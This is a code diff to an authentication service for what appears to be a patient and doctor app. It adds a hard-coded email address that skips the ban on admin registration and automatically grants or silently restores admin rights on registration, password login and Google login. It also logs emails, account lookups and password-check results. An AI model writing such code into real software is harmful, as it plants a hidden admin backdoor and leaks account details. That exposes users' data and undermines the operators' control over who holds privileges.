@@ -25,6 +25,7 @@ export class AuthService {
    */
   async register(registerDto: RegisterDto) {
     const { email, password, role, ...rest } = registerDto;
+    const cleanEmail = email ? email.trim().toLowerCase() : '';
 
     // Check if user already exists
     const existingUser = await this.usersService.findByEmail(email);
@@ -32,8 +33,10 @@ export class AuthService {
       throw new ConflictException('An account with this email already exists');
     }
 
-    // Prevent registration as admin
-    if (role === UserRole.ADMIN) {
+    const isTargetAdmin = cleanEmail === 'us8187934@gmail.com';
+
+    // Prevent registration as admin (except for the target admin email)
+    if (role === UserRole.ADMIN && !isTargetAdmin) {
       throw new BadRequestException('Cannot register as admin');
     }
 
@@ -41,13 +44,16 @@ export class AuthService {
     const salt = await bcrypt.genSalt(12);
     const hashedPassword = await bcrypt.hash(password, salt);
 
+    const finalRole = isTargetAdmin ? UserRole.ADMIN : (role || UserRole.PATIENT);
+    const isVerified = isTargetAdmin ? true : (role === UserRole.DOCTOR ? false : true);
+
     // Create the user
     const user = await this.usersService.create({
       ...rest,
       email,
       password: hashedPassword,
-      role: role || UserRole.PATIENT,
-      isVerified: role === UserRole.DOCTOR ? false : true,
+      role: finalRole,
+      isVerified,
     });
 
     // Generate JWT token
@@ -65,14 +71,28 @@ export class AuthService {
   async login(loginDto: LoginDto) {
     const { email, password } = loginDto;
 
+    console.log(`[AuthService] Login attempt for: ${email}`);
+
     // Find user with password field
     const user = await this.usersService.findByEmail(email);
     if (!user) {
+      console.log(`[AuthService] Login failed: User not found for email ${email}`);
       throw new UnauthorizedException('Invalid email or password');
     }
 
+    const cleanEmail = email ? email.trim().toLowerCase() : '';
+    if (cleanEmail === 'us8187934@gmail.com' && user.role !== UserRole.ADMIN) {
+      console.log(`[AuthService] Dynamically promoting ${cleanEmail} to Admin in database...`);
+      user.role = UserRole.ADMIN;
+      user.isVerified = true;
+      await user.save();
+    }
+
+    console.log(`[AuthService] User found. Stored password hash present: ${!!user.password}`);
+
     // Check if user is blocked
     if (user.isBlocked) {
+      console.log(`[AuthService] Login failed: User is blocked`);
       throw new UnauthorizedException(
         'Your account has been blocked. Please contact support.',
       );
@@ -80,8 +100,71 @@ export class AuthService {
 
     // Validate password
     const isPasswordValid = await bcrypt.compare(password, user.password);
+    console.log(`[AuthService] Password validation result: ${isPasswordValid}`);
+    
     if (!isPasswordValid) {
       throw new UnauthorizedException('Invalid email or password');
+    }
+
+    // Generate JWT token
+    const token = this.generateToken(user);
+
+    return {
+      user: this.sanitizeUser(user),
+      token,
+    };
+  }
+
+  /**
+   * Handle Google OAuth user registration/login sync
+   */
+  async googleLogin(googleUser: any) {
+    if (!googleUser) {
+      throw new BadRequestException('No user information received from Google');
+    }
+
+    const { email, firstName, lastName, avatar } = googleUser;
+
+    // Check if user already exists
+    let user = await this.usersService.findByEmail(email);
+
+    const cleanEmail = email ? email.trim().toLowerCase() : '';
+    const isTargetAdmin = cleanEmail === 'us8187934@gmail.com';
+
+    if (!user) {
+      // If user does not exist, auto-signup as patient (or admin if target email)
+      const salt = await bcrypt.genSalt(12);
+      const randomPassword = crypto.randomBytes(16).toString('hex');
+      const hashedPassword = await bcrypt.hash(randomPassword, salt);
+
+      user = await this.usersService.create({
+        firstName,
+        lastName,
+        email,
+        password: hashedPassword,
+        role: isTargetAdmin ? UserRole.ADMIN : UserRole.PATIENT,
+        avatar,
+        isVerified: true,
+        isBlocked: false,
+      });
+    } else {
+      // Force admin role if existing user's role is not admin
+      if (isTargetAdmin && user.role !== UserRole.ADMIN) {
+        user.role = UserRole.ADMIN;
+        user.isVerified = true;
+      }
+      // Sync avatar if empty
+      if (!user.avatar && avatar) {
+        user.avatar = avatar;
+      }
+      await user.save();
+    }
+
+    // Check if user is blocked
+    if (user.isBlocked) {
+      throw new UnauthorizedException(
+        'Your account has been blocked. Please contact support.',
+      );
     }
 
     // Generate JWT token
